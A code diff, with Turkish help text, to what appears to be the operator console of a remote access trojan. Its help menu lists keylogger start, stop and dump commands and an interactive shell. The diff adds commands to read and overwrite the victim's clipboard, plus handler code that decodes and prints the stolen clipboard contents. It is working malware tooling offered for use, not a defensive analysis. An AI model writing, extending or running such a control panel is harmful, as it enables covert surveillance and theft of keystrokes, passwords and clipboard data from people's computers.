@@ -288,6 +288,8 @@ class Handler(BaseHandler):
   keylogger_start       - Keylogger başlat (Windows)
   keylogger_stop        - Keylogger durdur
   keylogger_dump        - Tuş kayıtlarını getir ve kaydet
+  clipboard_get         - Pano içeriğini oku
+  clipboard_set <text>  - Pano içeriğini değiştir
 
 [Komut Çalıştırma]
   shell                 - İnteraktif shell başlat
@@ -474,6 +476,20 @@ class Handler(BaseHandler):
                                 
                         except Exception as e:
                             print(f"[!] Keylog kaydetme hatası: {str(e)}")
+
+                    # Clipboard Verisi: Pano içeriğini göster
+                    elif response.startswith("CLIPBOARD_DATA:"):
+                        try:
+                            b64_content = response.split(":", 1)[1]
+                            content = base64.b64decode(b64_content).decode('utf-8')
+                            
+                            print("-" * 40)
+                            print("[+] 📋 Pano İçeriği:")
+                            print("-" * 40)
+                            print(content)
+                            print("-" * 40)
+                        except Exception as e:
+                            print(f"[!] Pano verisi okuma hatası: {str(e)}")
                             
                     else:
                         print(response)
